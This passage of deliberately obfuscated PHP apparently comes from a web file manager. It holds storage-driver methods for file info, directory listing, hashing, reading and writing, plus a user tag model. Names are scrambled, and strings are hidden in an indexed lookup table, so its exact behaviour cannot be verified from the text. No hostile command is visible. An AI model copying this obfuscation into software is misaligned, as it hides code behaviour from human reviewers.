$this->iconvApp($³Ÿå’Ôä); if ($…õú…šñ) { return $this->getPathOuter($³Ÿå’Ôä); } $this->writeLog(__FUNCTION__ . $”¶å‡ÃŠ[1431], !0); return !1; } public function size($ÒşáÏÁ) { $ÒşáÏÁ = $this->iconvSystem($ÒşáÏÁ); return filesize_64($ÒşáÏÁ); } public function info($öâø­œ‹) { $öâø­œ‹ = $this->iconvSystem($öâø­œ‹); if ($this->isFolder($öâø­œ‹)) { return $this->folderInfo($öâø­œ‹); } else { if ($this->isFile($öâø­œ‹)) { return $this->fileInfo($öâø­œ‹); } } return !1; } protected function infoChildren($à‹Ê Ù¢, &$ªíÌÑÇĞ, $‡ÖóÆ¥‡ = true) { $‚è· Ñ† =& $_SERVER[£ğ°ÖØø]; check_abort_echo(); $à‹Ê Ù¢ = rtrim($à‹Ê Ù¢, $‚è· Ñ†[8]) . $‚è· Ñ†[8]; if ($‡ÖóÆ¥‡) { $à‹Ê Ù¢ = $this->iconvSystem($à‹Ê Ù¢); } if (!($šîğñî = @opendir($à‹Ê Ù¢))) { return; } while (($Ö÷®ˆ¤ = readdir($šîğñî)) !== !1) { if ($Ö÷®ˆ¤ == $‚è· Ñ†[10] || $Ö÷®ˆ¤ == $‚è· Ñ†[1346]) { continue; } $í„¼°¨¼ = $à‹Ê Ù¢ . $Ö÷®ˆ¤; if (is_file($í„¼°¨¼) || is_link($í„¼°¨¼)) { $ªíÌÑÇĞ[$‚è· Ñ†[80]]++; $ªíÌÑÇĞ[$‚è· Ñ†[79]] += filesize_64($í„¼°¨¼); } else { if (is_dir($í„¼°¨¼)) { $ªíÌÑÇĞ[$‚è· Ñ†[81]]++; $this->infoChildren($í„¼°¨¼, $ªíÌÑÇĞ, !1); } } } closedir($šîğñî); } private function folderInfo($ù§°œèî, $¿úû¯æ = false) { $•„Ëëç =& $_SERVER[£ğ°ÖØø]; $ù§°œèî = rtrim($ù§°œèî, $•„Ëëç[8]) . $•„Ëëç[8]; $Á“Üı¦ˆ = $this->iconvApp($this->pathThis($ù§°œèî)); if ($¿úû¯æ) { return array($•„Ëëç[32] => $Á“Üı¦ˆ, $•„Ëëç[87] => $this->getPathOuter($ù§°œèî), $•„Ëëç[33] => $•„Ëëç[78]); } $ØÙä‚¹¨ = array($•„Ëëç[32] => $Á“Üı¦ˆ, $•„Ëëç[87] => $this->getPathOuter($ù§°œèî), $•„Ëëç[33] => $•„Ëëç[78], $•„Ëëç[231] => @filectime($ù§°œèî), $•„Ëëç[88] => @filemtime($ù§°œèî), $•„Ëëç[1435] => @fileatime($ù§°œèî), $•„Ëëç[1436] => is_readable($ù§°œèî), $•„Ëëç[1437] => is_writable($ù§°œèî), $•„Ëëç[1438] => get_mode($ù§°œèî)); return $ØÙä‚¹¨; } private function fileInfo($²²ñ„‡Ò, $ØÜæäÈ = false) { $âïØòÚğ =& $_SERVER[£ğ°ÖØø]; $Ü·”¢Á¶ = $this->iconvApp($this->pathThis($²²ñ„‡Ò)); if ($ØÜæäÈ) { return array($âïØòÚğ[32] => $Ü·”¢Á¶, $âïØòÚğ[87] => $this->getPathOuter($²²ñ„‡Ò), $âïØòÚğ[33] => $âïØòÚğ[230], $âïØòÚğ[79] => $this->size($²²ñ„‡Ò), $âïØòÚğ[169] => $this->ext($Ü·”¢Á¶)); } $‹à®²ÍÌ = array($âïØòÚğ[32] => $Ü·”¢Á¶, $âïØòÚğ[87] => $this->getPathOuter($²²ñ„‡Ò), $âïØòÚğ[33] => $âïØòÚğ[230], $âïØòÚğ[231] => @filectime($²²ñ„‡Ò), $âïØòÚğ[88] => @filemtime($²²ñ„‡Ò), $âïØòÚğ[1435] => @fileatime($²²ñ„‡Ò), $âïØòÚğ[79] => $this->size($²²ñ„‡Ò), $âïØòÚğ[169] => $this->ext($Ü·”¢Á¶), $âïØòÚğ[1436] => is_readable($²²ñ„‡Ò), $âïØòÚğ[1437] => is_writable($²²ñ„‡Ò), $âïØòÚğ[1438] => get_mode($²²ñ„‡Ò)); return $‹à®²ÍÌ; } public function exist($ïøúÅİä) { $ïøúÅİä = $this->iconvSystem($ïøúÅİä); return @file_exists($ïøúÅİä); } public function isFile($äü˜«…•) { $äü˜«…• = $this->iconvSystem($äü˜«…•); return @is_file($äü˜«…•); } public function isFolder($íšËä‰ä) { $íšËä‰ä = $this->iconvSystem($íšËä‰ä); return @is_dir($íšËä‰ä); } public function listPath($ô¹ÑÒÛ, $³•òó‹ = false) { $ˆ ë…–â =& $_SERVER[£ğ°ÖØø]; $ô¹ÑÒÛ = $this->iconvSystem($ô¹ÑÒÛ); $ô¹ÑÒÛ = rtrim($ô¹ÑÒÛ, $ˆ ë…–â[8]) . $ˆ ë…–â[8]; $ÇïÉ®Ó‹ = array($ˆ ë…–â[85] => array(), $ˆ ë…–â[86] => array()); if (!($¾àªÅÏ = @opendir($ô¹ÑÒÛ))) { return $ÇïÉ®Ó‹; } while (($Ë–¥Ï¾Ô = readdir($¾àªÅÏ)) !== !1) { if ($Ë–¥Ï¾Ô == $ˆ ë…–â[10] || $Ë–¥Ï¾Ô == $ˆ ë…–â[1346]) { continue; } $ªŒœ’Õ¡ = $ô¹ÑÒÛ . $Ë–¥Ï¾Ô; if (is_file($ªŒœ’Õ¡)) { $ÇïÉ®Ó‹[$ˆ ë…–â[86]][] = $this->fileInfo($ªŒœ’Õ¡, $³•òó‹); } else { $ÇïÉ®Ó‹[$ˆ ë…–â[85]][] = $this->folderInfo($ªŒœ’Õ¡, $³•òó‹); } } closedir($¾àªÅÏ); return $ÇïÉ®Ó‹; } public function listAll($¤Ÿ¡ŸåÕ, &$”›¯®æ = array()) { $üş–•éì =& $_SERVER[£ğ°ÖØø]; $¤Ÿ¡ŸåÕ = $this->iconvSystem($¤Ÿ¡ŸåÕ); $¤Ÿ¡ŸåÕ = rtrim($¤Ÿ¡ŸåÕ, $üş–•éì[8]) . $üş–•éì[8]; if (!($”§Íåâú = @opendir($¤Ÿ¡ŸåÕ))) { return $”›¯®æ; } while (($¦ıÓÃ£ = readdir($”§Íåâú)) !== !1) { if ($¦ıÓÃ£ == $üş–•éì[10] || $¦ıÓÃ£ == $üş–•éì[1346]) { continue; } $¦åá‡ª´ = $¤Ÿ¡ŸåÕ . $¦ıÓÃ£; $°ºé–‹õ = is_dir($¦åá‡ª´) && !is_link($¦åá‡ª´) ? 1 : 0; $¦åá‡ª´ = $°ºé–‹õ ? $¦åá‡ª´ . $üş–•éì[8] : $¦åá‡ª´; $”›¯®æ[] = array($üş–•éì[87] => $¦åá‡ª´, $üş–•éì[78] => $°ºé–‹õ, $üş–•éì[88] => intval(@filemtime($¦åá‡ª´)), $üş–•éì[79] => $°ºé–‹õ ? 0 : intval($this->size($¦åá‡ª´))); if ($°ºé–‹õ) { $this->listAll($¦åá‡ª´, $”›¯®æ); } } closedir($”§Íåâú); return $”›¯®æ; } public function has($µ§ßüŞ›, $ÅöàõÃá = false, $‹è‘´Í = true) { $üÉÍÀ… =& $_SERVER[£ğ°ÖØø]; $µ§ßüŞ› = $this->iconvSystem($µ§ßüŞ›); $µ§ßüŞ› = rtrim($µ§ßüŞ›, $üÉÍÀ…[8]) . $üÉÍÀ…[8]; if (!($ÌÙÆâëœ = @opendir($µ§ßüŞ›))) { return !1; } $–÷Ø¬³Å = 0; $ò³‡Ñú = 0; $üïó°½Â = 0; while (($÷Ù®‹–Â = readdir($ÌÙÆâëœ)) !== !1) { if ($÷Ù®‹–Â == $üÉÍÀ…[10] || $÷Ù®‹–Â == $üÉÍÀ…[1346]) { continue; } $•á‹¦ˆ… = $µ§ßüŞ› . $÷Ù®‹–Â; if ($ÅöàõÃá) { $üïó°½Â++; if (@is_file($•á‹¦ˆ…)) { $–÷Ø¬³Å++; } else { $ò³‡Ñú++; } if ($üïó°½Â > 10000) { break; } continue; } if ($‹è‘´Í) { if (@is_file($•á‹¦ˆ…)) { return !0; } } else { if (@is_dir($•á‹¦ˆ… . $üÉÍÀ…[8])) { return !0; } } } closedir($ÌÙÆâëœ); if ($ÅöàõÃá) { return array($üÉÍÀ…[239] => $–÷Ø¬³Å, $üÉÍÀ…[240] => $ò³‡Ñú); } return !1; } public function hashSimple($Ñç·ä……) { $ê•ı¯ =& $_SERVER[£ğ°ÖØø]; if (!$Ñç·ä……) { return md5($ê•ı¯[12]); } $Ñç·ä…… = $this->iconvSystem($Ñç·ä……); $‘ÉíÈ = $this->size($Ñç·ä……); $â”Ä¯ĞÏ = 200; $«ì¾¿Ÿ = 50; if ($‘ÉíÈ <= $â”Ä¯ĞÏ * $«ì¾¿Ÿ) { return $this->hashMd5($Ñç·ä……) . $‘ÉíÈ; } $–šœùå = $ê•ı¯[12]; $Ş›ØíÈÁ = intval($‘ÉíÈ / $«ì¾¿Ÿ); $Ó£ıîú = fopen($Ñç·ä……, $ê•ı¯[1439]); if (!$Ó£ıîú) { return $–šœùå; } for ($æ¯µ«ñ¼ = 0; $æ¯µ«ñ¼ < $«ì¾¿Ÿ; $æ¯µ«ñ¼++) { fseek_64($Ó£ıîú, $Ş›ØíÈÁ * $æ¯µ«ñ¼); $–šœùå .= fread($Ó£ıîú, $â”Ä¯ĞÏ); } fseek_64($Ó£ıîú, $‘ÉíÈ - $â”Ä¯ĞÏ); $–šœùå .= fread($Ó£ıîú, $â”Ä¯ĞÏ); fclose($Ó£ıîú); return md5($–šœùå) . $‘ÉíÈ; } public function getContent($è³çİ§º) { $è³çİ§º = $this->iconvSystem($è³çİ§º); return file_get_contents($è³çİ§º); } public function setContent($Ç ç·Ú¤, $³œ¹à¾Æ = '') { $Ç ç·Ú¤ = $this->iconvSystem($Ç ç·Ú¤); $­«¼Äƒ = @file_put_contents($Ç ç·Ú¤, $³œ¹à¾Æ, LOCK_EX); if (!$­«¼Äƒ) { $this->writeLog(__FUNCTION__ . $_SERVER[£ğ°ÖØø][1431], !0); } clearstatcache(); @chmod($Ç ç·Ú¤, $this->pathAuth); return $­«¼Äƒ === !1 ? !1 : !0; } public function fileSubstr($¹ñÁ‚—, $’—ø»Š = 0, $¤°¤¹Í = false) { $ÏŠÄ³£À =& $_SERVER[£ğ°ÖØø]; $¹ñÁ‚— = $this->iconvSystem($¹ñÁ‚—); if ($¤°¤¹Í === !1) { $¤°¤¹Í = $this->size($¹ñÁ‚—); } if ($¤°¤¹Í <= 0) { return $ÏŠÄ³£À[12]; } $²­‚¬äâ = fopen($¹ñÁ‚—, $ÏŠÄ³£À[1439]); if (!$²­‚¬äâ) { return !1; } fseek_64($²­‚¬äâ, $’—ø»Š); $Ä™ÅÊÉ = fread($²­‚¬äâ, $¤°¤¹Í); fclose($²­‚¬äâ); if (!$Ä™ÅÊÉ) { $this->writeLog(__FUNCTION__ . $ÏŠÄ³£À[1431], !0); } return $Ä™ÅÊÉ; } public function upload($¾‘£™£Ì, $”¬—‹ì°, $»…ê‚Åï = false, $üßÛ£° = REPEAT_REPLACE) { if ($»…ê‚Åï) { return $this->moveFile($”¬—‹ì°, $¾‘£™£Ì); } return $this->copyFile($”¬—‹ì°, $¾‘£™£Ì); } public function setModifyTime($Áş˜ŞõÒ, $Ø¸ˆËĞ = '') { @touch($Áş˜ŞõÒ, intval($Ø¸ˆËĞ)); } public function download($Ÿ‡Œ†àĞ, $úèû«¢¸) { return $this->iconvSystem($Ÿ‡Œ†àĞ); } } goto f­Û²Àà; Dç‘êƒÇêœ: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\146\141\x76"; protected function cacheFunctionAlias($¡œÊÆ —) { $äê£´‡Ş =& $_SERVER[£ğ°ÖØø]; return array($äê£´‡Ş[2069] => array($äê£´‡Ş[2483] . USER_ID, $äê£´‡Ş[2070])); } protected function listData() { $¾È¬½ƒ‡ =& $_SERVER[£ğ°ÖØø]; $ÇğØ¥¬Ë = array($¾È¬½ƒ‡[1746] => USER_ID, $¾È¬½ƒ‡[566] => array($¾È¬½ƒ‡[2073], 0)); $›ÆÚË¯ = $¾È¬½ƒ‡[2484]; $²¿Œ­‹ = $this->field($›ÆÚË¯)->where($ÇğØ¥¬Ë)->order($¾È¬½ƒ‡[2076])->select(); return $²¿Œ­‹ ? $²¿Œ­‹ : array(); } protected function addToTag($®ƒ—ÈÛ×, $¨İøÔ·) { $­Ü­ö–– =& $_SERVER[£ğ°ÖØø]; if (!Model($­Ü­ö––[2220])->listData($¨İøÔ·)) { return !1; } if (is_numeric($®ƒ—ÈÛ×)) { $Œ«ç‹‚ = Model($­Ü­ö––[888])->pathInfo($®ƒ—ÈÛ×); if (!$Œ«ç‹‚) { return !1; } } else { $Œ«ç‹‚ = IO::infoSimple($®ƒ—ÈÛ×); if (!$Œ«ç‹‚) { return !1; } $­ƒµ‰¤ = $Œ«ç‹‚[$­Ü­ö––[32]]; $š›¯ö¬Å = $Œ«ç‹‚[$­Ü­ö––[33]]; if (isset($Œ«ç‹‚[$­Ü­ö––[494]])) { $š›¯ö¬Å = $Œ«ç‹‚[$­Ü­ö––[494]] == $­Ü­ö––[91] ? $­Ü­ö––[78] : $­Ü­ö––[230]; } } $‰ŒŒ†¢ = array($­Ü­ö––[1746] => USER_ID, $­Ü­ö––[566] => $¨İøÔ·, $­Ü­ö––[504] => $®ƒ—ÈÛ×, $­Ü­ö––[505] => $š›¯ö¬Å ? $š›¯ö¬Å : $­Ü­ö––[499], $­Ü­ö––[503] => $­ƒµ‰¤ ? $­ƒµ‰¤ : $­Ü­ö––[12], $­Ü­ö––[1958] => 0); if ($this->where($‰ŒŒ†¢)->find()) { return !1; } return $this->add($‰ŒŒ†¢); } protected function removeFromTag($şŠÁòÁí, $…÷ë“¢‹) { $ÁšõùÅ =& $_SERVER[£ğ°ÖØø]; if (!Model($ÁšõùÅ[2220])->listData($…÷ë“¢‹)) { return !1; } if (is_array($şŠÁòÁí)) { $şŠÁòÁí = array($ÁšõùÅ[7], $şŠÁòÁí); } $Óã±‚ŞØ = array($ÁšõùÅ[1746] => USER_ID, $ÁšõùÅ[566] => $…÷ë“¢‹, $ÁšõùÅ[504] => $şŠÁòÁí); return $this->where($Óã±‚ŞØ)->delete(); } protected function removeByTag($Á³ƒşêÈ) { $Í•İœû =& $_SERVER[£ğ°ÖØø]; if (!$Á³ƒşêÈ) { return !1; } $Æ¾âã•Ã = array($Í•İœû[1746] => USER_ID, $Í•İœû[566] => $Á³ƒşêÈ); return $this->where($Æ¾âã•Ã)->delete(); } protected function removeBySource($±øüéÀŒ) { $ûêÅŞ´ =& $_SERVER[£ğ°ÖØø]; if (is_array($±øüéÀŒ)) { $±øüéÀŒ = array($ûêÅŞ´[7], $±øüéÀŒ); } $¨ØíÕ¡ = array($ûêÅŞ´[1746] => USER_ID, $ûêÅŞ´[566] => array($ûêÅŞ´[1075], 0), $ûêÅŞ´[504] => $±øüéÀŒ); return $this->where($¨ØíÕ¡)->delete(); } }